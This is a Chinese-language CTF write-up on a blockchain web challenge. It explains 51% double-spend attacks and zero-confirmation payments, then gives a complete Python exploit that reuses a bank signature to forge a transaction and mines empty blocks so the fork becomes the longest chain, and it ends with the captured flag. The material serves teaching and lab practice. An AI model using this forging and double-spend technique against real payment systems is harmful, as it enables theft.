# Web_python_block_chain

## 思路分析

> 打开网页,看开一些区块链信息,能查看源码,下载,区块链就不会了,看别人WP说是51%攻击.

## 51% 双花攻击

> 这道题整的解法是 51% （双花）攻击。

> 请于正常的区块链区分开来，题目环境中只有你一个玩家，并没有人与你竞争（挖矿）。

> 商店交易采用0确认，而不是现实中的6确认。

> 当出现分叉时，区块链的规则认最长的分链为主链，并舍去原有的链。

> 区块链允许添加空块

> 51%（双花）攻击可以达到的目的就是使攻击前的交易作废，这里的前不一定是前一个，而是很大程度上取决于你的算力的。让之前的交易作废有什么好处呢？这里我们就要考虑0确认和6确认的区别了。

## 6确认

> 当产生一笔交易时，区块链的P2P网络会广播这笔交易，这笔交易会被一个挖矿节点收到，并验证，如果这个挖矿节点挖到区块（生成的hash满足条件）后，并且这笔交易的手续费足够吸引这个节点去打包进区块，那这笔交易就会被打包进区块。因此就得到了一个确认，这个矿工也拿走了相应的手续费。 这个挖矿节点打包后，会把区块广播给其他节点。其他节点验证并广播这个区块。 如果这个区块得到更多的挖矿节点的验证确认，那就得到了更多的确认。这样这笔交易就被记录到了比特币区块链，并成为了比特币账本的一部分。如果得到6个确认后，我们就认为它永远不可变了。

## 0确认

> 0确认就同样的道理了，那就是不需要别人确认，就如我们生活中的一手交钱一手交货，不同的是生活中我们处于中心化社会，银行会帮我们确认。而6确认就是需要经过6个人(区块被挖出)交易才确定。

> 可以看到对0确认和6确认进行51%(双花)攻击的难度是不一样的，6确认需要的算力明显要大，因为他要多比其他人生成6个区块。好在，题目并不是采用6确认。

然后再看看这里的51% 攻击，其实这里说的51%是指算力，也就是这种攻击需要攻击者具备全网51%的算力，因为这样才有机会使自己生成（挖出）区块的速度超过其他人，然后按区块链的规则：当出现分叉时，区块链的规则认最长的分链为主链，并舍去原有的链，就达到了撤销原来链上已经存在的交易，拿回该交易使用了的钱的目的，这里我的另一个理解就是可以使交易回滚，从而追回被盗的钱。

## payload

```
import re
import json
import uuid
import hashlib
import requests
from functools import reduce

# 一堆变量常量

url_root = "http://61.147.171.105:54354"
url_create = "http://61.147.171.105:54354/create_transaction"
url_flag = "http://61.147.171.105:54354/flag"

s = requests.Session()
ddcoin = s.get(url_root)

prev_one= re.search(r"hash of genesis block: ([0-9a-f]{64})", ddcoin.text, flags = 0).group(1)
bank_utox_id= re.search(r"\"input\": \[\"([0-9a-f\-]{36})", ddcoin.text, flags = 0).group(1)
bank_signature= re.search(r"\"signature\": \[\"([0-9a-f]{96})", ddcoin.text, flags = 0).group(1)

DIFFICULTY = int('00000' + 'f' * 59, 16)
EMPTY_HASH = '0'*64

bank_addr = "b4f841897c5c65946e416444e1de2f4407c7ef5d73aea05f76016217da23199c70c9bbaa4c844a8c5c487b6633c1ecd7"
hacke_addr = "c549666e5f138f974dc278338ab6f1c0276769f97c0c621cba93528c69fb573d0d14c671195d49c3b353785a08560eed"
shop_addr = "ba0bdbe9bd6e00ecdcb8f2647a93e703990bacdcdc6e295cb0ce8a05c25c48eeb57f11948047bbf5a644ed277cafc019"

# 源码中的API

def hash(x):
    return hashlib.sha256(hashlib.md5(x.encode('utf-8')).digest()).hexdigest()

def hash_reducer(x, y):
    return hash(hash(x) + hash(y))

def hash_block(block):
    return reduce(hash_reducer, [block['prev'], block['nonce'], reduce(hash_reducer, [tx['hash'] for tx in block['transactions']], EMPTY_HASH)])

def hash_utxo(utxo):
    return reduce(hash_reducer, [utxo['id'], utxo['addr'], str(utxo['amount'])])

def hash_tx(tx):
    return reduce(hash_reducer, [
        reduce(hash_reducer, tx['input'], EMPTY_HASH),
        reduce(hash_reducer, [utxo['hash'] for utxo in tx['output']], EMPTY_HASH)
    ])

def create_output_utxo(addr_to, amount):
    utxo = {'id': str(uuid.uuid4()), 'addr': addr_to, 'amount': amount}
    utxo['hash'] = hash_utxo(utxo)
    return utxo

def create_tx(input_utxo_ids, output_utxo, privkey_from=None):
    tx = {'input': input_utxo_ids, 'signature':[bank_signature], 'output': output_utxo}  # 修改了签名
    tx['hash'] = hash_tx(tx)
    return tx

def create_block(prev_block_hash, nonce_str, transactions):
    if type(prev_block_hash) != type(''): raise Exception('prev_block_hash should be hex-encoded hash value')
    nonce = str(nonce_str)
    if len(nonce) > 128: raise Exception('the nonce is too long')
    block = {'prev': prev_block_hash, 'nonce': nonce, 'transactions': transactions}
    block['hash'] = hash_block(block)
    return block


# 构造的方法

def check_hash(prev,tx):
    for i in range(10000000):
        current_block = create_block(prev, str(i), tx)
        block_hash = int(current_block['hash'], 16)
        if block_hash < DIFFICULTY:
            print(json.dumps(current_block))
            return current_block

def create_feak_one():
    utxo_first = create_output_utxo(shop_addr, 1000000)
    tx_first = create_tx([bank_utox_id], [utxo_first])
    return check_hash(prev_one, [tx_first])

def create_empty_block(prev):
    return check_hash(prev, [])


# 攻击过程

a = create_feak_one()
print(s.post(url_create, data = str(json.dumps(a))).text)
b = create_empty_block(a['hash'])
print(s.post(url_create, data = str(json.dumps(b))).text)
c = create_empty_block(b['hash'])
print(s.post(url_create, data = str(json.dumps(c))).text)
d = create_empty_block(c['hash'])
print(s.post(url_create, data = str(json.dumps(d))).text)
e = create_empty_block(d['hash'])
print(s.post(url_create, data = str(json.dumps(e))).text)
print(s.get(url_flag).text)
```

## flag

> ctf{922a488e-f243-4b09-ae2d-fa2725da79ea}

## 参考

> https://blog.csdn.net/hxhxhxhxx/article/details/108111692